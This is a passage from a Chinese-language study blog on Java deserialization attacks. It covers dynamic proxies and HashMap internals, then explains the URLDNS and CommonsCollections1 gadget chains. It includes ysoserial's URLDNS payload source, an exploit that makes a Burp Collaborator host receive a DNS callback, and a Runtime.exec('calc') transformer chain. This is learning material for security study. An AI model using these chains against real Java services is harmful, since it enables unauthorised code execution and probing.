class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而<strong>动态代理</strong>并不需要创建代理类，可以通过JDK提供的<code>Proxy.newProxyInstance()</code>和<code>InvocationHandler</code>实现实例化接口，调用接口的类</p>
<p>例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestTwo</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        InvocationHandler handler = <span class="keyword">new</span> InvocationHandler() &#123; <span class="comment">// 用于实现调用接口的方法</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(method.getName().equals(<span class="string">&quot;test&quot;</span>))&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;ttest&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 强制转化 实现对接口的实例化</span></span><br><span class="line">        TestIns testIns = (TestIns) Proxy.newProxyInstance(</span><br><span class="line">                TestIns.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> Class[] &#123;TestIns.class&#125;,</span><br><span class="line">                handler);</span><br><span class="line">        testIns.test();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">TestIns</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么现在来试着跟进了解一下<code>Proxy.newProxyInstance</code>和<code>InvocationHandler</code></p>
<p><code>InvocationHandler</code>是由代理实例的调用处理程序实现的接口。每个代理实例都有一个关联的调用处理程序。在代理实例上调用方法时，方法调用将被编码并发送到其调用处理程序的invoke方法。按照个人的理解，即可以在InvocationHandler里面对接口的方法进行重载或者其他操作。</p>
<p><code>Proxy.newProxyInstance</code>的定义（参数分别是类加载器、一个实例以及一个InvocationHandler：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">newProxyInstance</span><span class="params">(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h)</span></span></span><br></pre></td></tr></table></figure>

<p><a href="https://qiankunli.github.io/2020/04/09/java_dynamic_proxy.html">参考</a>暂时审计java的代码真的理解不能，<em>记号！！！</em></p>
<h3 id="Map-HashMap……"><a href="#Map-HashMap……" class="headerlink" title="Map/HashMap……"></a>Map/HashMap……</h3><blockquote>
<p>因为对Map类不熟悉的话 很难真的懂下面的链子，所以就先浅浅了解一下</p>
</blockquote>
<p><code>Map</code>是一个接口也可说是集合类，其中&lt;&gt;代表为泛型，而Map为键值对的集合，其中每一个键映射到一个值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Map</span>&lt;<span class="title">K</span>, <span class="title">V</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>基本方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>; <span class="comment">// 返回映射键值对的个数</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>; <span class="comment">// 判断集合类是否为空 即不包含任何键值对则返回true</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">containsKey</span><span class="params">(Object key)</span></span>; <span class="comment">// 判断集合类中是否包含该映射</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">containsValue</span><span class="params">(Object value)</span></span>; </span><br><span class="line"><span class="function">V <span class="title">get</span><span class="params">(Object key)</span></span>; <span class="comment">// 返回key对应的value</span></span><br><span class="line"><span class="function">V <span class="title">put</span><span class="params">(K key, V value)</span></span>; <span class="comment">// 将指定的键和值互相关联 会返回与键关联的上一个值或者如果与键关联的上一个值为null的话会返回null</span></span><br><span class="line"><span class="function">V <span class="title">remove</span><span class="params">(Object key)</span></span>; <span class="comment">// 如果包含该key关联的映射则直接删除，并返回之前与key关联的value或者null</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span>; <span class="comment">// 清除集合</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span></span>; <span class="comment">// 返回该映射的哈希值</span></span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>而就像上面讲到的一样，<code>HashMap</code>就是接口<code>Map</code>的一个实现类，在里面实现了<code>Map</code>的方法</p>
<p><code>HashMap</code></p>
<p>好几个内部类现在就先不看了，继续看后面的</p>
<p>有四个构造方法<code>HashMap</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity, <span class="keyword">float</span> loadFactor)</span> </span>&#123;  <span class="comment">// 参数不能为负数</span></span><br><span class="line">    ……</span><br><span class="line">    <span class="keyword">this</span>.loadFactor = loadFactor;</span><br><span class="line">    <span class="keyword">this</span>.threshold = tableSizeFor(initialCapacity); <span class="comment">// 返回initialCapacity的两倍幂。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(initialCapacity, DEFAULT_LOAD_FACTOR); <span class="comment">// 将常量和int一起传，重新调用一次上面的构造方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.loadFactor = DEFAULT_LOAD_FACTOR; <span class="comment">// all other fields defaulted</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(Map&lt;? extends K, ? extends V&gt; m)</span> </span>&#123; <span class="comment">// 传入一个Map类型的参数</span></span><br><span class="line">    <span class="keyword">this</span>.loadFactor = DEFAULT_LOAD_FACTOR; <span class="comment">// 默认值</span></span><br><span class="line">    putMapEntries(m, <span class="keyword">false</span>); <span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>put</code>方法，利用<code>putValue</code>实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>小结1：因为跟着走了一下，所以对这个集合类有了大概的了解，所以就先看到这里，等之后遇到新的方法的时候再记录到这里（鸽</p>
</blockquote>
<h3 id="URL-DNS链"><a href="#URL-DNS链" class="headerlink" title="URL DNS链"></a>URL DNS链</h3><p><del>再再再次来走一遍URLDNS链！！！！！</del></p>
<p>urldns链子主要是在反序列化的时候触发<code>HashMap</code>的<code>readObject</code>方法，触发<code>hash</code>函数，从而可以触发<code>URL</code>的<code>hashCode</code>方法触发DNS请求，通常用来验证题目是否存在反序列化漏洞</p>
<p><a href="https://github.com/frohoff/ysoserial">ysoserial</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line">                HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为链子已经清楚，是反序列化的时候调用<code>HashMap</code>的<code>readObject</code>方法，所以我们可以先直接看<code>HashMap</code></p>
<p>首先我们是把url当作key给HashMap的，所以可以只看最后的一段内容，因为前面都不会涉及到key，然后我们可以发现，在<code>putvalue</code>的时候调用了hash函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        K key = (K) s.readObject();</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        V value = (V) s.readObject();</span><br><span class="line">    putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>hash函数里面重新给h赋值，并且调用key的hashCode方法，而我们已经知道是URL.hashCode()，可以直接去看看</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>); <span class="comment">// 获取key的hashCode</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果<code>hashCode</code>的值不为-1，则直接返回，否则跳转到另一个<code>hashCode</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有<code>getHostAddress</code>方法，参数为我们传入的url，如果我们传入的不是IPV4的格式就会调用<code>getByName</code>,从而在<code>getByName</code>时候造成对url进行DNS解析请求</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220325204635981.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> u.getHostAddress();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hostAddress != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> hostAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (host == <span class="keyword">null</span> || host.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        hostAddress = InetAddress.getByName(host); <span class="comment">// 根据主机名获取ip名字 触发DNS请求</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnknownHostException | SecurityException ex) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/a230d1786edd444e9f53be8688e9c379.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>注意:</p>
<p>​    1.当一开始URL的hashCode为-1的时候也会自动发生DNS请求，所以在<code>URLStreamHandler handler = new SilentURLStreamHandler();</code>重写<code>getHostAddress</code>，将handler传给url，使得一开始执行getHostAddress方法的时候并不会发现DNS请求，从而防止了一开始发生DNS请求，但是<code>handle</code>又是为<code>transient</code>类型，在序列化的时候不参与，所以后面并不会影响反序列化的时候调用我们需要的<code>getHostAddress</code>方法</p>
<p>​    2.而后面又在<code>Reflections.setFieldValue(u, &quot;hashCode&quot;, -1);</code>中设置hashCode为-1，实现在反序列化之前强制<code>hashCode</code>为-1，从而后面的getHostAddress方法可以调用</p>
<p>exp:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;output.txt&quot;</span>));</span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream os = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = os.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, Integer&gt;();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://zy1ok3czhtt8z7qmwpi4xkxiy942sr.burpcollaborator.net&quot;</span>);</span><br><span class="line">        Class c = url.getClass();</span><br><span class="line">        Field field = c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(url,<span class="number">1223</span>);</span><br><span class="line">        hashMap.put(url,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//        hashMap.put(new URL(&quot;http://g0h5mkegjavp1os3y6klz1zz0q6gu5.burpcollaborator.net&quot;), 1);</span></span><br><span class="line">        field.set(url,-<span class="number">1</span>); <span class="comment">// hashcode改成-1</span></span><br><span class="line">       </span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;output.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>后记：又过了一遍之后确实比第一遍会更明白一些，但是还有有着一种悬浮感（？，如果硬是要说也是能把师傅们对于这个链子的解析说出来，但是自己却不一定真的完全能理解其中的点，感觉是比较细节的、底层的知识还是不够，继续学习吧！</p>
</blockquote>
<h3 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h3><p>（jdk&lt;8u71</p>
<p>因为ysoserial的payload实在有点难以理解，所以先跟P神的链子吧</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                                   <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),&#125;;</span><br><span class="line">        </span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>,transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Transformer</code>是一个接口，方法返回值类一个类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function">Object <span class="title">transform</span><span class="params">(Object var1)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ConstantTransformer</code>是实现<code>Transformer</code>和<code>Serializable</code>接口的类，在构造的时候传入一个类并在重载接口的方法的时候将这个类返回，所以上面的<code>new ConstantTransformer(Runtime.getRuntime())</code>会返回<code>Runtime.getRuntime()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123; </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">6374440726369055124L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Transformer NULL_INSTANCE = <span class="keyword">new</span> ConstantTransformer((Object)<span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Transformer <span class="title">getInstance</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (Transformer)(constantToReturn == <span class="keyword">null</span> ? NULL_INSTANCE : <span class="keyword">new</span> ConstantTransformer(constantToReturn));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getConstant</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>InvokerTransformer</code>，构造函数里传入的值为方法名、参数类型以及参数，然后在重载<code>Transformer</code>的方法的时候进行对应的函数调用，实现任意方法调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	·····</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            ······</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ChainedTransformer</code>将多个<code>transformers</code>串联起来，即前一个的返回值即为下一个的参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再来看最后几行的，先去看一下<code>decorate</code>，只是进行一个类的实例和属性初始化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>,transformerChain); <span class="comment">// 实例化一个新的TransformedMap</span></span><br><span class="line">outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer); <span class="comment">// 将map传给父类，其他用于初始化，</span></span><br><span class="line">    <span class="comment">// this.valueTransformer = transformerChain;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

